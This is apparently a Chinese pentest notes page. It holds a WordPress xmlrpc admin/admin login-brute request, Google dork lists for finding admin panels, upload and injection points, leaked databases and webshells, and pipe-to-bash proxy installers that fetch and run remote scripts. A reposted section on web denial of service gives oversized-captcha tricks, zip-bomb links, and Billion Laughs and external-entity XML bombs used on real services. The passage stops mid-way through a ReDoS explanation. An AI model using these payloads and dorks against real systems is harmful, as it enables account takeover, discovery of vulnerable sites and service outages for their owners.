<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/xmlrpc.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>XXXXXXXX</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>217</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>wp.getUsersBlogs<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">params</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;<span class="name">param</span>&gt;</span><span class="tag">&lt;<span class="name">value</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">value</span>&gt;</span><span class="tag">&lt;/<span class="name">param</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/16.png" alt="2"></p>
</li>
</ul>
<h3 id="利用谷歌语法">利用谷歌语法</h3>
<h4 id="googlehack基本语法">googlehack基本语法</h4>
<ul>
<li>
<p>查看基本情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inurl:*.asp 返回一些基本信息</span><br><span class="line">site:xx.com 返回所有与该有关的url</span><br><span class="line">link:xx.com 返回所有与该站做了连接的站</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查找后台</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:xx.com intext:管理</span><br><span class="line">site:xx.com inurl:login</span><br><span class="line">site:xx.com intitle:后台</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查看服务器使用的程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:xx.com filetype:asp</span><br><span class="line">site:xx.com filetype:php</span><br><span class="line">site:xx.com filetype:jsp</span><br><span class="line">site:xx.com filetype:aspx</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查看上传漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:xx.com inurl:file</span><br><span class="line">site:xx.com inurl:load</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>查找注射点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:xx.com filetype:asp</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>搜索上传点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inurl:&lt;?action=upload.asp</span><br><span class="line">inurl:../..com/upload.asp?action=</span><br><span class="line">Inurl:userManage-Admin.do?tt=</span><br><span class="line">news-News.do?</span><br><span class="line">Inurl:admin.php?action=add</span><br><span class="line">Inurl:editnews.asp?id=</span><br><span class="line">ADODB.connection</span><br><span class="line">site:edu.cn inurl:asp?mdb=</span><br><span class="line">?id=%3c&lt;mdb.action&gt;</span><br><span class="line">&quot;microsoft access driver (*mdb)&quot;</span><br><span class="line">Server.createobject (&quot;adodb.connection&quot;)</span><br><span class="line">Upload.php?type=</span><br><span class="line">?action=upfile</span><br><span class="line">?action=pic</span><br><span class="line">?typeid=</span><br><span class="line">inurl:../../../..admin/,..edit../../?..upload../../..</span><br><span class="line">inurl:../web../..db/../..</span><br><span class="line">inurl:../..baoming/..edit/..upload/../..php/</span><br><span class="line">inurl:../../..edit/..upload/../..php/</span><br><span class="line">inurl:../../..edit/..upload/../..asp/</span><br><span class="line">inurl:..news/..admin/../..upload/..</span><br><span class="line">default.asp?Action=</span><br><span class="line">SELECT BOOK1.* FROM BOOK1</span><br><span class="line">ADODB.Recordset</span><br><span class="line">&amp;ErrorMessage=</span><br><span class="line">default.asp?</span><br><span class="line">inurl:..cn/..bm/../..upload/../..asp/</span><br><span class="line">&lt;!--#include file=&quot;../inc/AspCms_SettingClass.asp&quot; --&gt;</span><br><span class="line">inurl:save.asp?action=</span><br><span class="line">Upimg.asp?pid=</span><br><span class="line">showimg.asp?id=</span><br><span class="line">add.asp?myid=</span><br><span class="line">filetype:asp site:.cn inurl:upload.asp</span><br><span class="line">filetype:config inurl:web.config inurl:ftp </span><br><span class="line">filetype:aspx site:.cn inurl:export.aspx</span><br><span class="line">filetype:sh inurl:cgi-bin</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>搜索管理后台</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:XXX.com intext:管理|后台|登陆|用户名|密码|验证码|系统|帐号</span><br><span class="line">site:XXX.com inurl:login/admin/manage/manager/admin_login/login_admin/system/boss/master</span><br><span class="line">site:XXX.com intitle:管理|后台|登陆|</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>搜索上传漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:XXX.com inurl:file</span><br><span class="line">site:XXX.com inurl:load</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>搜索注入点页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:XXX.com inurl:php?id=</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>搜索编辑器页面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:xxxx.com inurl:fck</span><br><span class="line">site:XXXX.com inurl:ewebeditor</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>搜索重要文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:xxx.com inurl:robots.txt</span><br><span class="line">site:XXX.com filetype:mdb</span><br><span class="line">site:xxx.com filetype:ini</span><br><span class="line">site:xxx.com inurl:txt</span><br><span class="line">site:xxx.com filetype:php</span><br><span class="line">site:xxx.com filetype:asp</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>搜索暴库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%3c  </span><br><span class="line">%23</span><br><span class="line">site:cn inurl:mdb?Page=  </span><br><span class="line">&lt;!--#include File=&quot;conn.asp&quot;--&gt;</span><br><span class="line">inurl:&lt;%@( !-- #include= )%&gt;</span><br><span class="line">inurl:./../&lt;dir&gt;/..=config.php</span><br><span class="line">inurl:&lt;%( (Dir = ) )%&gt;</span><br><span class="line">inurl:&lt;%@()%&gt;</span><br><span class="line">inurl:&lt;%( (set=nothing) )%&gt;</span><br><span class="line">inurl:&lt;%@(&quot;ADODB.Connection&quot;)%&gt;</span><br><span class="line">inurl:&lt;%@(&quot;Response.End&quot;)%&gt;</span><br><span class="line">inurl:&lt;%@(&quot;ADODB.Recordset&quot;)%&gt;</span><br><span class="line">inurl:&lt;%@(&quot;Microsoft Access Driver&quot;(*.mdb)&quot;)%&gt;</span><br><span class="line">inurl:&lt;%@( web.config )%&gt;</span><br><span class="line">inurl:&lt;%@( Server.CreateObject)%&gt;</span><br><span class="line">inurl:&lt;%@( end if )%&gt;</span><br><span class="line">inurl:&lt;%@(  Action=Trim(request(&quot;Action&quot;)) )%&gt;</span><br><span class="line">inurl:&lt;%@( &lt;%=fl.Setup(0)%&gt; )%&gt;</span><br><span class="line">inurl:&lt;%@( (HTTP_REFERER) )%&gt;</span><br><span class="line">inurl:&lt;%( (*.asp) )%&gt;</span><br><span class="line">inur:&lt; %?(&quot; down=*.mdb &quot;)?%&gt;</span><br><span class="line">inurl:&lt;%( re.Pattern= )%&gt;</span><br><span class="line">inurl:&lt;%( set conn=server.createobject )%&gt;</span><br><span class="line">inurl:&lt;%( Referer=re.Replace )%&gt;</span><br><span class="line">inurl:&lt;%( (conn.ConnectionString) )%&gt;</span><br><span class="line">newsadd1.asp?E_BigClassID=</span><br><span class="line">showerr.asp?action=error&amp;message=</span><br><span class="line">Request.ServerVariables</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>搜索生成EXCEL文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ , # , &#x27; ,%  ,^  ,&amp;  ,?   ,(,)   ,&lt;,&gt;  ,  [,]  ,  &#123;,&#125;   ,/,\  ,;,:,  常用特殊符号</span><br><span class="line">Action typle get post save getForm  value  Move send  set add del edit upload  Messages</span><br><span class="line">40%</span><br><span class="line">%20</span><br><span class="line">%3c</span><br><span class="line">=%3C%25=rs(</span><br><span class="line">%3C%=rc(0)%%3E</span><br><span class="line">%3C%=Rs1(</span><br><span class="line">%3C%=rs(</span><br><span class="line">%3C%=rsn(</span><br><span class="line">%3C%=rs2(</span><br><span class="line">%3C%=(ttt+2)%</span><br><span class="line">%3C%=i%%3E</span><br><span class="line">%3C%=int(pageid-1)%%3E</span><br><span class="line">echo  dir </span><br><span class="line">\--with-mysql=</span><br><span class="line">?a[]=%3Ca+href%  phpinfo</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>杂项</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intitle:Password:  inurl:aspx</span><br><span class="line">intext:webshell filetype:asp site:cn</span><br><span class="line">intitle:aspxshell filetype:aspx </span><br><span class="line">intitle:webshell filetype:asp</span><br><span class="line">inurl:excel.asp site:cn</span><br><span class="line">intext:高校报名考试 author:数据导出 inurl:asp</span><br><span class="line">filetype:xlsx &quot;密码</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="外网服务器搭建">外网服务器搭建</h3>
<ul>
<li>
<p>一键搭建<code>SSR</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget --no-check-certificate https://freed.ga/github/shadowsocksR.sh; bash shadowsocksR.sh</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>一件搭建<code>v2rav </code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -s -L https://git.io/v2ray.sh)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="v2rav-客户端">v2rav 客户端</h3>
<p><strong>Windows客户端</strong>：</p>
<ul>
<li>V2RayN： <a target="_blank" rel="noopener" href="https://github.com/2dust/v2rayN/releases">官网下载</a>    <a target="_blank" rel="noopener" href="https://www.hijk.pw/v2rayn-config-tutorial/">使用教程</a></li>
<li>V2RayW： <a target="_blank" rel="noopener" href="https://github.com/Cenmrev/V2RayW/releases">官网下载</a>    <a target="_blank" rel="noopener" href="https://www.hijk.pw/v2rayw-config-tutorial/">使用教程</a></li>
<li>V2RayS：  <a target="_blank" rel="noopener" href="https://github.com/Shinlor/V2RayS/releases">官网下载</a>    <a target="_blank" rel="noopener" href="https://www.hijk.pw/v2rays-config-tutorial/">使用教程</a></li>
<li>Clash：   <a target="_blank" rel="noopener" href="https://github.com/Fndroid/clash_for_windows_pkg/releases">官网下载</a></li>
</ul>
<p><strong>Windows系统建议使用V2rayN</strong>，界面简洁大气且支持Vmess和Shadowsocks。</p>
<p><strong>安卓客户端</strong>：</p>
<ul>
<li>V2RayNG：     <a target="_blank" rel="noopener" href="https://github.com/2dust/v2rayNG/releases">官网下载</a>    <a target="_blank" rel="noopener" href="https://www.hijk.pw/v2rayng-config-tutorial/">使用教程</a></li>
<li>BifrostV：        <a target="_blank" rel="noopener" href="https://apkpure.com/bifrostv/com.github.dawndiy.bifrostv">官网下载</a></li>
</ul>
<p><strong>Mac客户端</strong>：</p>
<ul>
<li>V2RayU：     <a target="_blank" rel="noopener" href="https://github.com/yanue/V2rayU/releases">官网下载</a>     <a target="_blank" rel="noopener" href="https://www.hijk.pw/v2rayu-config-tutorial/">使用教程</a></li>
<li>V2RayX：       <a target="_blank" rel="noopener" href="https://github.com/Cenmrev/V2RayX/releases">官网下载</a>      <a target="_blank" rel="noopener" href="https://www.hijk.pw/v2rayx-config-tutorial/">使用教程</a></li>
<li>ClashX：     <a target="_blank" rel="noopener" href="https://github.com/yichengchen/clashX/releases">官网下载</a></li>
</ul>
<p><strong>Mac OS X系统建议使用V2rayU</strong>，有中文界面且支持vmess/shadowsocks/socks协议。</p>
<h3 id="命令行设置代理">命令行设置代理</h3>
<ul>
<li>
<p>CMD</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set http_proxy=http://127.0.0.1:10808</span><br><span class="line">set https_proxy=http://127.0.0.1:10808</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>PowerShell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$Env:http_proxy=&quot;http://127.0.0.1:10808&quot;;</span><br><span class="line">$Env:https_proxy=&quot;http://127.0.0.1:10808&quot;;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Mac</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export http_proxy=http://127.0.0.1:1087;export https_proxy=http://127.0.0.1:1087;export ALL_PROXY=socks5://127.0.0.1:1080</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="查看服务器开了哪些请求">查看服务器开了哪些请求</h3>
<p>利用OPTIONS参数查看服务器开启了哪些请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -i -X OPTIONS https://www.ascotbe.com</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/1.jpeg" alt="1"></p>
<h3 id="web层面上的那些拒绝服务攻击">Web层面上的那些拒绝服务攻击</h3>
<blockquote>
<p>转载地址：<a target="_blank" rel="noopener" href="https://www.sec-in.com/article/445">https://www.sec-in.com/article/445</a></p>
</blockquote>
<h4 id="资源生成大小可控">资源生成大小可控</h4>
<p>现在有许多资源是由服务器生成然后返回给客户端的，而此类“资源生成”接口如若有参数可以被客户端控制（可控），并没有做任何资源生成大小限制，这样就会造成拒绝服务风险。</p>
<p>此类场景多为：图片验证码、二维码</p>
<h5 id="实际场景">实际场景</h5>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/20.png" alt="图片.png"></p>
<p>关注一下接口地址：<code>https://xxx/validcode?w=130&amp;h=53</code></p>
<p>参数值：<code>w=130&amp;h=53</code>，我们可以理解为生成的验证码大小<strong>长为130</strong>，<strong>宽为53</strong></p>
<p>可以将<code>w=130</code>修改为<code>w=130000000000000000</code>，让服务器生成超大的图片验证码从而占用服务器资源造成拒绝服务。</p>
<p>图片验证码在登录、注册、找回密码…等功能比较常见：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/21.png" alt="图片.png"></p>
<h4 id="zip炸弹">Zip炸弹</h4>
<p>不知道各位有没有听说过Zip炸弹，一个42KB的压缩文件(Zip)，解压完其实是个<code>4.5PB</code>的“炸弹”。</p>
<p>先不说<code>4.5PB</code>这个惊人的大小，光解压都会占用极大的内存。</p>
<p>该文件的下载地址：<a target="_blank" rel="noopener" href="https://github.com/Ascotbe/virus/blob/master/ZipBomb/RecursiveBomb.zip">https://github.com/Ascotbe/virus/blob/master/ZipBomb/RecursiveBomb.zip</a></p>
<p>解压这个<code>42.zip</code>以后会出现<code>16</code>个压缩包，每个压缩包又包含<code>16</code>个，如此循环<code>5</code>次，最后得到<code>16</code>的<code>5</code>次方个文件，也就是<code>1048576</code>个文件，这一百多万个最终文件，每个大小为<code>4.3GB</code>。<br>
因此整个解压过程结束以后，会得到 <code>1048576 * 4.6 GB = 4508876.8 GB</code>，也就是 <code>4508876.8 ÷ 1024 ÷ 1024 = 4.5 PB</code>。</p>
<p>通过以上说明，我们可以寻找存在解压功能的Web场景进行拒绝服务攻击，但是这里有一个前置条件就是需要解压并可以递归解压。</p>
<p>那我们想要完成这一攻击就非常的困难了，“前辈”也提到了非递归的Zip炸弹，也就是没有嵌套Zip文件文件的，如下表格：</p>
<table>
<thead>
<tr>
<th style="text-align:left">名称</th>
<th style="text-align:left">解压结果</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://github.com/Ascotbe/virus/blob/master/ZipBomb/zbsm.zip">zbsm.zip</a></td>
<td style="text-align:left">42 kB → 5.5 GB</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://github.com/Ascotbe/virus/blob/master/ZipBomb/zblg.zip">zblg.zip</a></td>
<td style="text-align:left">10 MB → 281 TB</td>
</tr>
<tr>
<td style="text-align:left"><a target="_blank" rel="noopener" href="https://github.com/Ascotbe/virus/blob/master/ZipBomb/zbxl.zip">zbxl.zip</a></td>
<td style="text-align:left">46 MB → 4.5 PB (Zip64, less compatible)</td>
</tr>
</tbody>
</table>
<p>存在解压功能的Web场景还是比较多的，可以根据实际业务场景进行寻找。</p>
<h5 id="实际场景">实际场景</h5>
<p>根据实际业务场景发现一处上传模板文件功能，根据简单的测试，发现此处上传Zip文件会自动解压：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/22.png" alt="图片.png"></p>
<p>这里我选择上传<code>zbsm.zip</code>上去，看一下服务器反应:</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/23.png" alt="图片.png"></p>
<p>这里整个服务的请求都没有返回结果，成功造成拒绝服务。</p>
<h4 id="xdos-xml拒绝服务攻击">XDoS(XML拒绝服务攻击)</h4>
<p>XDoS，XML拒绝服务攻击，其就是利用DTD产生XML炸弹，当服务端去解析XML文档时，会迅速占用大量内存去解析，下面我们来看几个XML文档的例子。</p>
<h5 id="billion-laughs">Billion Laughs</h5>
<p>据说这被称为<strong>十亿大笑DoS攻击</strong>，其文件内容为：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">keyz</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">key</span> <span class="string">&quot;key&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">key2</span> <span class="string">&quot;&amp;key;&amp;key;&amp;key;&amp;key;&amp;key;&amp;key;&amp;key;&amp;key;&amp;key;&amp;key;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">key3</span> <span class="string">&quot;&amp;key2;&amp;key2;&amp;key2;&amp;key2;&amp;key2;&amp;key2;&amp;key2;&amp;key2;&amp;key2;&amp;key2;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">key4</span> <span class="string">&quot;&amp;key3;&amp;key3;&amp;key3;&amp;key3;&amp;key3;&amp;key3;&amp;key3;&amp;key3;&amp;key3;&amp;key3;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">key5</span> <span class="string">&quot;&amp;key4;&amp;key4;&amp;key4;&amp;key4;&amp;key4;&amp;key4;&amp;key4;&amp;key4;&amp;key4;&amp;key4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">key6</span> <span class="string">&quot;&amp;key5;&amp;key5;&amp;key5;&amp;key5;&amp;key5;&amp;key5;&amp;key5;&amp;key5;&amp;key5;&amp;key5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">key7</span> <span class="string">&quot;&amp;key6;&amp;key6;&amp;key6;&amp;key6;&amp;key6;&amp;key6;&amp;key6;&amp;key6;&amp;key6;&amp;key6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">key8</span> <span class="string">&quot;&amp;key7;&amp;key7;&amp;key7;&amp;key7;&amp;key7;&amp;key7;&amp;key7;&amp;key7;&amp;key7;&amp;key7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">key9</span> <span class="string">&quot;&amp;key8;&amp;key8;&amp;key8;&amp;key8;&amp;key8;&amp;key8;&amp;key8;&amp;key8;&amp;key8;&amp;key8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">keyz</span>&gt;</span>&amp;key9;<span class="tag">&lt;/<span class="name">keyz</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这是一段实体定义，从下向上观察第一层发现<code>key9</code>由10个<code>key8</code>组成，由此类推得出<code>key[n]</code>由10个<code>key[n-1]</code>组成，那么最终算下来实际上<code>key9</code>由<code>10^9</code>(1000000000)个<code>key[..]</code>组成，也算是名副其实了～</p>
<p>本地测试解析该XML文档，大概占用内存在2.5GB左右（其他文章中出现的均为3GB左右内存）：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/24.png" alt="图片.png"></p>
<p>试想：<strong>这只是9层级炸弹，如果再多一点呢？</strong></p>
<h5 id="external-entity">External Entity</h5>
<p>外部实体引用，文档内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">keyz</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="keyword">wechat</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://dldir1.qq.com/weixin/Windows/WeChatSetup.exe&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">keyz</span>&gt;</span><span class="symbol">&amp;wechat;</span><span class="tag">&lt;/<span class="name">keyz</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个理解起来就很简单了，就是从外部的链接中去获取解析实体，而我们可以设置这个解析URL为一个超大文件的下载地址，以上所举例就是微信的。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/25.png" alt="图片.png"></p>
<p>当然，我们也可以设置一个不返回结果的地址，如果外部地址不返回结果，那么这个解析就会在此处一直挂起从而占用内存。</p>
<h5 id="internal-entity">Internal Entity</h5>
<p>内部实体引用，文档内容如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">keyz</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY a <span class="string">&quot;a...a&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">keyz</span>&gt;</span><span class="symbol">&amp;a;</span>...<span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">keyz</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>其意思就是实体<code>a</code>的内容又臭又长，而后又N次引用这个实体内容，这就会造成解析的时候占用大量资源。</p>
<h5 id="实际场景">实际场景</h5>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/26.png" alt="图片.png"></p>
<p>一开始通过此处上传<code>doc</code>文档的功能，发现了一枚<code>XXE注入</code>，提交后厂商进行修复，但复测后发现其修复的结果就是黑名单<code>SYSTEM</code>关键词，没办法通过带外通道读取敏感数据了～</p>
<p>抱着试一试的心态将<code>Billion Laughs</code>的<code>Payload</code>放入到<code>doc</code>文档中(这里与<code>XXE doc文档</code>制作方式一样修改<code>[Content_Types].xml</code>文件，重新打包即可)：</p>
<p>上传之后产生的效果就是网站延时极高，至此就完成了整个测试。</p>
<h4 id="redos-正则表达式拒绝服务攻击">ReDoS(正则表达式拒绝服务攻击)</h4>
<p>ReDoS，正则表达式拒绝服务攻击，顾名思义，就是由正则表达式造成的拒绝服务攻击，当编写校验的正则表达式存在缺陷或者不严谨时，攻击者可以构造特殊的字符串来大量消耗服务器的系统资源，造成服务器的服务中断或停止。</p>
<p>在正式了解ReDoS之前，我们需要先了解一下正则表达式的两类引擎：</p>
<table>
<thead>
<tr>
<th style="text-align:left">名称</th>
<th style="text-align:left">区别</th>
<th style="text-align:left">应用</th>
<th style="text-align:left">匹配方式</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">DFA</td>
<td style="text-align:left">DFA对于文本串里的每一个字符只需扫描一次，速度快、特性少</td>
<td style="text-align:left">awk(大多数版本)、egrep（大多数版本）、flex、lex、MySQL、Procmail…</td>
<td style="text-align:left">文本比较正则</td>
</tr>
<tr>
<td style="text-align:left">NFA</td>
<td style="text-align:left">NFA要翻来覆去标注字符、取消标注字符，速度慢，但是特性(如:分组、替换、分割)丰富</td>
<td style="text-align:left">GNU Emacs、Java、grep（大多数版本）、less、more、.NET语言、PCRE library、Perl、PHP（所有三套正则库）、Python、Ruby、set（大多数版本）、vi…</td>
<td style="text-align:left">正则比较文本</td>
</tr>
</tbody>
</table>
<p>文本比较正则：看到一个子正则，就把可能匹配的文本全标注出来，然后再看正则的下一个部分，根据新的匹配结果更新标注。</p>
<p>正则比较文本：看见一个字符，就把它跟正则比较，匹配就标注下来，然后接着往下匹配。一旦不匹配，就忽略这个字符，以此类推，直到回到上一次标注匹配的地方。</p>
<p>那么存在ReDoS的核心就是<strong>NFA正则表达式引擎</strong>，它的多模式会让自身陷入递归险境，从而导致占用大量CPU资源，性能极差，严重则导致拒绝服务。</p>
<h5 id="nfa-回溯">NFA 回溯</h5>
<p>简单的聊一下什么是回溯，这里有一个正则表达式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ke&#123;1,3&#125;y </span><br></pre></td></tr></table></figure>
<p>其意图很简单，<code>e</code>字符需要匹配1-3次，<code>k</code>、<code>y</code>匹配一次即可。</p>
<p>现在我们遇到了两个需要匹配的字符串：</p>
<ul>
<li>keeey</li>
<li>key</li>
</ul>
<p>字符串<code>keeey</code>的匹配过程是一气呵成的：匹配<code>k</code>完成之后，完整匹配<code>e</code>，最后是匹配<code>y</code></p>
<p>字符串<code>key</code>的匹配过程就发生了回溯，其匹配过程如下图所示（<strong>橙色为匹配，黄色为不匹配</strong>）：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/27.png" alt="图片.png"></p>
<p>前两步属于正常，但从第3步开始就不一样了，这里字符串<code>key</code>已经有一个<code>e</code>被<code>e&#123;1,3&#125;</code>匹配，但它不会就此作罢，而会继续向后用正则<code>e&#123;1,3&#125;</code>匹配字符<code>y</code>，而当发现字符不匹配后，就忽略该字符，返回到上一次标注匹配的字符<code>e</code>再进行一次匹配，至此就发生了一次回溯，最后匹配<code>y</code>结束整个正则匹配过程。</p>
<p>那么为什么会产生回溯呢？这跟NFA的贪婪模式有关（贪婪模式默认是开启的）。</p>
<h5 id="nfa-贪婪">NFA 贪婪</h5>
<p>我们想要彻底摸清楚整个过程就要抛根问底，究其原理，所以来了解一下贪婪模式～</p>
<p>根据以上所举的案例我们可以理解贪婪模式导致的回溯其实就是：<strong>不撞南墙不回头</strong></p>
<p>以下所列的元字符，大家应该都清楚其用法：</p>
<p>i. <code>?</code>: 告诉引擎匹配前导字符0次或一次，事实上是表示前导字符是可选的。<br>
ii. <code>+</code>: 告诉引擎匹配前导字符1次或多次。<br>
iii. <code>*</code>: 告诉引擎匹配前导字符0次或多次。<br>
iv. <code>&#123;min, max&#125;</code>: 告诉引擎匹配前导字符min次到max次。min和max都是非负整数。如果有逗号而max被省略了，则表示max没有限制；如果逗号和max都被省略了，则表示重复min次。</p>
<p>默认情况下，这个几个元字符都是贪婪的，也就是说，它会根据前导字符去匹配尽可能多的内容。这也就解释了之前所举例的回溯事件了。</p>
<h5 id="恶意正则表达式">恶意正则表达式</h5>
<p>错误的使用以上所列的元字符就会导致拒绝服务的风险，此类称之为恶意的正则表达式，其表现形式为：</p>
<ol>
<li>使用重复分组构造</li>
<li>在重复组内会出现：重复、交替重叠</li>
</ol>
<p>简单的表达出来就是以下几种情况(有缺陷的正则表达式会<strong>包含如下部分</strong>)：</p>
